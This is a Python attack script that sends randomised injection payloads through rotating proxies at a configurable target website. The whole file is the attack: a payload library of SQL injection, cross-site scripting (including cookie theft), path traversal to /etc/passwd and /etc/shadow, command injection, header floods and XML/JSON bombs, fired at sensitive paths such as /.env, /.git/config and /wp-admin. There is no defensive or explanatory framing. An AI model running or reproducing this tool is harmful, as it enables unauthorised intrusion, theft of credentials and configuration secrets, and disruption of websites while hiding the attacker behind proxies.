import asyncio
import aiohttp
import sys
import signal
import random
import uuid

TARGET_URL = "https://example.com"  # CHANGE THIS
PROXY_FILE = "proxies.txt"
RPS = 12

running = True
proxy_list = []

# PAYLOAD LIBRARY
PAYLOADS = [
    # SQL Injection
    lambda: f"' OR '{random.randint(1,999)}'='{random.randint(1,999)}",
    lambda: f"admin'--{random.randint(1000,9999)}",
    lambda: f"1' UNION SELECT null,{random.randint(1,999)}--",
    lambda: f"'+AND+{random.randint(1,9)}={random.randint(1,9)}",
    lambda: f"') OR ({random.randint(1000,9999)}={random.randint(1000,9999)}",
    
    # XSS
    lambda: f"<script>alert({random.randint(1,999)})</script>",
    lambda: f"\" onmouseover=\"alert({random.randint(1,999)})",
    lambda: f"<img src=x onerror=alert({random.randint(1,999)})>",
    lambda: f"<svg/onload=alert({random.randint(1,999)})>",
    lambda: f"javascript:alert(document.cookie)",
    
    # Path Traversal
    lambda: f"../../../etc/passwd{random.randint(100,999)}",
    lambda: f"..\\..\\..\\windows\\system32\\cmd.exe",
    lambda: f"%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    lambda: f"../../../../../../../../../../etc/shadow",
    
    # Command Injection
    lambda: f"; ls -la /tmp{random.randint(100,999)}",
    lambda: f"| dir C:\\",
    lambda: f"`id`",
    lambda: f"$(whoami)",
    
    # Header Bombs
    lambda: "X" * random.randint(1000, 5000),
    lambda: "Cookie: " + "a" * random.randint(2000, 8000),
    
    # JSON/XML Bombs
    lambda: '{"a":' * random.randint(10, 30) + 'null' + '}' * random.randint(10, 30),
    lambda: f"<?xml version=\"1.0\"?><!DOCTYPE bomb [<!ENTITY a \"{'A' * random.randint(100, 500)}\">]><bomb>&a;</bomb>"
]

def load_proxies():
    global proxy_list
    try:
        with open(PROXY_FILE, 'r') as f:
            proxy_list = [line.strip() for line in f if line.strip()]
        proxy_list = list(dict.fromkeys(proxy_list))[:10]
    except:
        proxy_list = []

def random_endpoint():
    base = TARGET_URL.rstrip('/')
    paths = ['/', '/api/', '/admin/', '/login/', '/wp-admin/', '/console/', 
             '/manage/', '/test/', f'/user/{uuid.uuid4().hex[:8]}/', 
             f'/id/{random.randint(1,999999)}/', f'/search?q={uuid.uuid4().hex[:6]}',
             '/.git/config', '/.env', '/wp-config.php', '/config.php',
             f'/uploads/{random.randint(2020,2024)}/{random.randint(1,12)}/']
    return base + random.choice(paths)

async def send_infector(session, proxy):
    endpoint = random_endpoint()
    payload = random.choice(PAYLOADS)()
    
    attack_type = random.choice(['param', 'header', 'path', 'body'])
    
    try:
        if attack_type == 'param':
            sep = '&' if '?' in endpoint else '?'
            target = f"{endpoint}{sep}{uuid.uuid4().hex[:4]}={payload}"
            async with session.get(target, proxy=proxy, timeout=3) as _:
                pass
        elif attack_type == 'header':
            headers = {f'X-{uuid.uuid4().hex[:6]}': payload}
            async with session.get(endpoint, headers=headers, proxy=proxy, timeout=3) as _:
                pass
        elif attack_type == 'path':
            target = f"{endpoint}/{payload}"
            async with session.get(target, proxy=proxy, timeout=3) as _:
                pass
        else:
            data = {uuid.uuid4().hex[:6]: payload}
            async with session.post(endpoint, data=data, proxy=proxy, timeout=3) as _:
                pass
    except:
        pass

async def infector_worker():
    load_proxies()
    if not proxy_list:
        return
    
    connector = aiohttp.TCPConnector(limit=0, force_close=True)
    
    # Distribute 12 RPS across proxies
    sessions = []
    proxies_to_use = proxy_list[:3] if len(proxy_list) >= 3 else proxy_list
    for proxy in proxies_to_use:
        session = aiohttp.ClientSession(connector=connector)
        sessions.append((session, proxy))
    
    # Calculate requests per proxy to achieve 12 RPS total
    requests_per_second = 12
    requests_per_proxy = requests_per_second // len(sessions)
    
    while running:
        tasks = []
        for session, proxy in sessions:
            for _ in range(requests_per_proxy):
                tasks.append(send_infector(session, proxy))
        
        # Execute batch
        if tasks:
            await asyncio.gather(*tasks, return_exceptions=True)
        
        # Sleep to maintain exact 12 RPS
        await asyncio.sleep(1)
    
    # Cleanup
    for session, _ in sessions:
        await session.close()

def signal_handler(sig, frame):
    global running
    running = False

if __name__ == "__main__":
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)
    
    asyncio.run(infector_worker())
